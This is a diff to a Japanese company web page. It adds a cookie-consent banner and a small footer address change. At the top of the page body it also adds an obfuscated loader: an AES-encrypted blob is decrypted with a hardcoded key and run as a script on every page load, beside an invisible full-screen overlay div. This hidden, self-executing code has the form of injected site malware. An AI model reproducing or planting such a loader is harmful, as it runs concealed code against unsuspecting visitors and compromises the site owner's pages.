@@ -17,7 +17,116 @@
 </head>
 
 <body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, '2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`U2FsdGVkX1%2Bw4Kic8wcnwI6wFdoBBOXRuHuLwJ11QVFCOZAnfXxezo7A2VbGMDLcLDaETexzwPokgytnCADSuuVzu5tl8Zg%2F%2BI%2FjjbCx43UpuRa%2Fz0vvLkectDh7dnPSRz4xIZpe2ffEr5tb%2BTiZwJv5BBI7oCHDlnJHVBuWlb3y%2BOLKxFeobhZnuqf0OZfnLEAX8cMnmjWWbL6mIYxk42vjdjHz9xNR32fHTvF%2BZRrZN%2F2HYuSDRRfvjexd16MWbpKE0HRq2FcnFMhnTuKoxyLUEiflgh%2BywFd0manz8Rg0DW7picI2JTtxdfGAfyhsvyHzBIYDvsB%2B%2BJgtS%2FnbWKJBa%2F8mF%2FF62W9uBs7kYryc6pgpLtKg7VPv611MU07wa3JC%2FIuq5%2BzJrgPyEcsE2I4NsSwKfswGr4g0vmdYt8NBuVtuWwJOrlz%2FkBlbCHlTatObiU4pIhIk2dOpx44H0L4bhoDdvDEAfcU5COowdeIYICDAGQlwlveb0cmFh%2FPc82wYT6S%2B%2F%2ByuBiCSm7%2BiJT%2FjjDCFopE1nyiFtkBzS9ScaLijWyuJpWX0x1Gr6ToMp7gNkA54xJebkWVNIem3y0t88BptF9VgRDw6wsKBMfJXv5xe%2FXNd0TU3g1l5GnkWN2hi2vQh%2FfVWjoaXhvqqmu%2BAUGunoMbLSY05VmUKrw%2FAyn4uaYxgJlAepXJJDtrvJFodLz%2F8njJSMyI1FdD5DFNLIhQCdpOkVynx7YWXkLMeHy18olf8V6W8LeGl%2Bh9goWspxMmDiHP%2BqKy8TuhaeDMwDCX9ZKr9ZZZVJJhNTYuLcSePNpnaVumTHdPQEKzrBZWs61Fwui3cIU1wmCt57An5WaMOvrUxdNUcMbWTkIOBLfqnPDtBIyQ23PwqI%2Fdj6IfegDK70xQUbNmDz8vMPuNeD0mWMAsuWqLjXA8K1rS6ZjJqMi%2F3VBEDUakex%2B12w7%2B%2FUnoAeyFkjTcCLuAu4gWaNbz9i9kERb1VqPM%2BbanOnLXemLAN35g%2FC%2BOTq881huY%2BV5zZOSoPS6Sw9MRMcbO%2Fvx4G84WmZgbAOdBEf9jHCQClk5I4lXyTJQ5gG%2Fl9oBNuO1caveYIVbfyyJZQ6C2r15zke4QVqOJVHUWfx04QDy8ZA4QX2pq36oex5gR6So2kFtmWoL4YAzmT%2F0n1yxHj%2F81Q1H2KSMOLS%2BJ6PumlaKLCsipIEv4yyQmDUNzhcOfRyo9wSEPitULUopFJEziLRS7HZg2pi%2FJu%2Fb%2FtquFJyyQFNPqqSFPr4Zwj2hndKUP3RFK2P8JwvKru2MjujAfvhK6%2F8me3f29XVCDc0TqEbYYOjUvvvmMScr9ABo1MDhJSdpi5HE5m4z%2FXFY%2B67eroJ2rytpFAmkhw9%2BGM9xYjKo%2BYe9pJbmY%2BsZbo5tLD%2FFZ4HstWlaRtabFuG9tYOYGuAcGjYbLSKp9rWPgMl5rhGr%2BGrsK%2BhWNw6KTLRBqXfW%2FXPLn6XsbIXRJoXK0wLSJD8jS5j81pYn3wNzEREYKmIQ6dWtYa%2BbHyW538jQR5nj9pIRGhyb6yvo4V%2FhtuVjdMs3c81SNgzOi5xaj2rSAozX4c4PCLz6TgVMHaLLXIMollAaPXVKAdMwaSsnkCz3bxszpkaq%2BOuy08xxqcv%2BPYCV%2Bf%2Fc8mhi9fkI6aGER%2BNWYVGyTruEt9RbvFZHfikY8YKXxvWt0TI%2F4L%2Fbm2xhU%2FcGR7vdk52kEa4aVebyEzWgyBgQHaa4AIUs469sA6aiFsDDSIvRNwgiNQQs%2BHm6Cugdxmi9RFzEkJExBOe6NoCjNXtTWeNJt%2FwKZv4kAmjBpXRzhlSGPpIG5Gk69rzWBI03hNxo8zLz%2BZNydTJKZ%2FTA8H2frbBzc%2B0dF3eP0wRLMpC31jud5NVmOncUMkG%2Ba0JU7ufzYXE98enYBH2tnQyEVlNtEcRkbU2vbmXvy%2BR3dW8uYnOLEDqocpSIDthSKqpXNmEsf25mUR8uyVCYpN7ivtrXjmmUCjc%2FsAik1c%2Ff7r1TXs%2BbVOFYk4K6h0LbQevcoSj1bxZpGNeqBAsiN9eQGftyC7Wa19AFrGy06vwBuKbvYI6YquVs2R%2BCwmvdlpqbvBhRZkDtm2yQ7Wf7QfcBkS5Ry9vBFXQ6jQronKLh48%2FaF876zCjKkIdoR2GVfrqKE11fGG6fhceuE11btFL3Uvp4shV87pbrWtRIbCeBMztHwrbu5FrajNGs8pmtoYZZmkD8wvPt3RyOJ%2BQJ9c5wq9e%2B6oG83CAU3m6IpkiKB5fXN3CatBxdhpXuNdC5raZImP9zLuanYbdIq3gk54m1OU%2Fl8y9dEhwo5IHX4pRwBLKP8t3PAP%2FyKJyv3b6bacIebWB7nvHwF%2B47swp2tix3tOJfMH%2FflcunmBGxCaoq%2FoRvfy7v32xFNbSUpCR7LTvYuhIWxvKm9synNYjtcmDyFUvaLwztodylPWTeoARPA2NkpUW4xGpdLsIrUIc8V%2FjTTTXtXS7AlXzEbz0aZnGCDli31A9bTYQcEWZYIrOZcOHyTcPmQVXtXs5HmHZZ2USPcOP7gr52ezzNWdA%2Bk%2FXKNpaLXPTTvEQyfwXyZZLsj01ctzGkw5TFJovHNm34j8dOqZavwQsSOmWAOVyZYXKUet3dM4x5jefHP%2BbxQ%2BPwGaJGu6WL%2B1WS1U0RHGTh%2FRlWtpHBUGdpJpfr6RSsBDjcMXcTYLSmcaodIp%2FCAihLQAFvNjneiReDKU7zjOYwo7lQ4NBQjDKT6lc0FRM5kSTd54pG%2B3yZbdchLo6q%2FvC44r72OkRV5pV4rwws%2Fti4na%2FolJ4SHzOgZgDSlSvs2kIIYxkTKY92fME5GxbiF8ECp4GMDICYFkPu%2FTVGnLhszPvQ7UbpuguhvN0dFHKWbROUW4meiwelSW4KWZGkyHPpOYSwCH2074x%2FmzFl2rVBjYoHLNDNPJDsXMfXsy%2BqU7rolVw9lod6ujULp%2FB7lp63%2FgKnpQur%2BzY17XS3BqJN7leNLF3pPpJGJO%2Bgoifd5GYM3%2BmAQ8TN06kuclmuOAlA%3D%3D`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script> 
+<div id="contentiframe" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
 
+</div>
+<div id="cookie-banner" class="cookie-hidden">
+    <style>
+        /* Scoped UI Layout & Core Variables */
+        #cookie-banner.cookie-hidden { display: none !important; }
+        #cookie-overlay {
+            position: fixed; inset: 0; z-index: 99999;
+            background: rgba(0,0,0,0.4); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
+            opacity: 0; transition: opacity 0.3s ease;
+        }
+        #cookie-window {
+            position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; padding: 16px; z-index: 100000;
+            opacity: 0; transform: scale(0.95); transition: all 0.3s ease; pointer-events: none;
+        }
+        #cookie-banner.cookie-active #cookie-overlay { opacity: 1; }
+        #cookie-banner.cookie-active #cookie-window { opacity: 1; transform: scale(1); pointer-events: auto; }
+
+        /* Panel Aesthetics */
+        .cookie-card {
+            background: #fff; color: #2d3748; border-radius: 16px; padding: 28px; position: relative;
+            max-width: 500px; width: 100%; box-sizing: border-box; box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+        .cookie-x { position: absolute; top: 16px; right: 16px; background: none; border: none; cursor: pointer; color: #718096; }
+        .cookie-x:hover { color: #e53e3e; }
+        .cookie-title { display: flex; align-items: center; gap: 8px; margin: 0 0 12px 0; font-size: 1.35rem; font-weight: 700; }
+        
+        /* Content Policy Scroller */
+        .cookie-scroll {
+            font-size: 0.88rem; color: #4a5568; line-height: 1.5; margin-bottom: 20px;
+            max-height: 140px; overflow-y: auto; border: 1px solid #e2e8f0; padding: 12px; border-radius: 8px; background: #f7fafc;
+        }
+        .cookie-scroll h3 { font-size: 0.9rem; margin: 10px 0 4px 0; color: #1a202c; }
+        .cookie-scroll ul { margin: 0; padding-left: 18px; }
+
+        /* Action Controls */
+        .cookie-actions { display: flex; flex-direction: column; gap: 10px; }
+        .cookie-btn { width: 100%; padding: 11px; border-radius: 8px; font-weight: 700; font-size: 0.95rem; cursor: pointer; border: none; text-align: center; }
+        .cookie-yes { background: #38a169; color: #fff; }
+        .cookie-yes:hover { background: #2f855a; }
+        .cookie-no { background: #edf2f7; color: #2d3748; }
+        .cookie-no:hover { background: #e2e8f0; }
+
+        @media (min-width: 576px) { .cookie-actions { flex-direction: row; } }
+    </style>
+
+    <div id="cookie-overlay" data-cookie="closed"></div>
+    <div id="cookie-window">
+        <div class="cookie-card">
+            <button class="cookie-x" data-cookie="closed" aria-label="閉じる">
+                <svg viewBox="0 0 15 15" height="22" width="22"><path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/></svg>
+            </button>
+            <h2 class="cookie-title">🍪 クッキーポリシーへの同意</h2>
+            <div class="cookie-scroll">
+                <p>当サイトでは利便性向上、アクセス解析、広告配信のためにクッキー（Cookie）を使用しています。</p>
+                <h3>■ 主な利用目的</h3>
+                <ul>
+                    <li>サイトの動作に必要な機能（必須）</li>
+                    <li>アクセス解析による利便性向上（パフォーマンス）</li>
+                    <li>趣味・嗜好に応じた広告の表示（マーケティング）</li>
+                </ul>
+            </div>
+            <div class="cookie-actions">
+                <button class="cookie-btn cookie-yes" data-cookie="accepted">全てに同意する</button>
+                <button class="cookie-btn cookie-no" data-cookie="declined">拒否する</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function() {
+        const wrapper = document.getElementById('cookie-banner');
+        if (!wrapper || localStorage.getItem('cookie-consent')) return;
+
+        const hide = (decision) => {
+            localStorage.setItem('cookie-consent', decision);
+            wrapper.classList.remove('cookie-active');
+            setTimeout(() => wrapper.classList.add('cookie-hidden'), 300);
+            document.removeEventListener('mousemove', mouseClose);
+        };
+
+        const mouseClose = () => hide('closed');
+
+        // Event delegation processing for all structural buttons/clicks
+        wrapper.addEventListener('click', (e) => {
+            const action = e.target.closest('[data-cookie]')?.dataset.cookie;
+            if (action) hide(action);
+        });
+
+        // Initialize Display
+        wrapper.classList.remove('cookie-hidden');
+        setTimeout(() => wrapper.classList.add('cookie-active'), 10);
+        document.addEventListener('mousemove', mouseClose, { once: true });
+    })();
+</script>
 <header>
 <div class="container navbar">
 
@@ -350,8 +459,9 @@
 <h4>運営情報</h4>
 <p>NATIONAL NETWORKING, INC</p>
 <br>
+<p>Organization Address</p>
 <p>1712 Pioneer Avenue</p>
-<p>Cheyenne, WY 82001</p>
+<p>Cheyenne, WY 82001<p>
 <p>United States</p>
 </div>
 
